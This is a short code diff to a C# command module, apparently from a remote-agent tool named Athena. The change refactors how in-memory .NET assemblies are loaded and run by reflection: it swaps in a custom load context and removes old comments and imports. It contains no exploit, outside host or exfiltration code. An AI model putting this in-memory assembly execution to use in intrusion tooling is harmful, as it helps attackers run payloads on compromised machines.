@@ -1,8 +1,7 @@
-﻿using System;
+﻿using Athena.Commands.Model;
+using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Runtime.Loader;
-using System.Text;
 
 namespace Athena.Commands
 {
@@ -28,12 +27,6 @@ namespace Athena.Commands
         }
         public static bool ExecuteAssembly(byte[] asm, string args)
         {
-
-            //This may have issues with long running tasks, will have to verify
-            //May have to change this to write to named pipe, and have the main loop pull the output from there.
-            //Maybe output like this?
-            //https://stackoverflow.com/questions/11911660/redirect-console-writeline-from-windows-application-to-a-string
-
             //Will need to figure out how to determine when output is finished? Maybe add some sleeps and check the buffer, if nothing in the buffer then mark as complete and return?
             try
             {
@@ -53,7 +46,7 @@ namespace Athena.Commands
             try
             {
                 Globals.alc.Unload();  
-                Globals.alc = new AssemblyLoadContext("Athena");
+                Globals.alc = new ExecuteAssemblyContext();
                 return "AssemblyLoadContext cleared!";
             }
             catch (Exception e)
@@ -75,8 +68,6 @@ namespace Athena.Commands
         }
         public static string RunLoadedCommand(string name, Dictionary<string, object> args)
         {
-            //Code from here: https://stackoverflow.com/questions/14479074/c-sharp-reflection-load-assembly-and-invoke-a-method-if-it-exists
-            //In case still broken.
             try
             {
                 Type t = Globals.loadedcommands[name].GetType("Athena.Plugin");
